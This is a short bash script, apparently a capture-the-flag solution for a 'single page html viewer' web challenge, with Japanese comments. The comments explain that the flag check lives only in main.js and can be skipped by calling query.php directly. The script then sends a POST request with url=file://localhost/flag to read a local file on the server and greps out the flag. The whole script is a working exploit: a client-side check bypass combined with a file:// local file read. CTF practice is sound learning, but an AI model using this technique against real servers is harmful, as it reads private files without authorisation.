#!/bin/bash

# main.jsを見ると/flag/へのアクセスをチェックして弾いているが、curlでmain.jsを通さずにquery.phpにリクエストすることでチェックは回避できる
# ローカルファイルはfile://で読み込む
curl -X POST https://awebc19.archiso.dev/problems/single_page_html_viewer_2/query.php -d 'url=file://localhost/flag' | grep --color=auto "WebC{.*}"
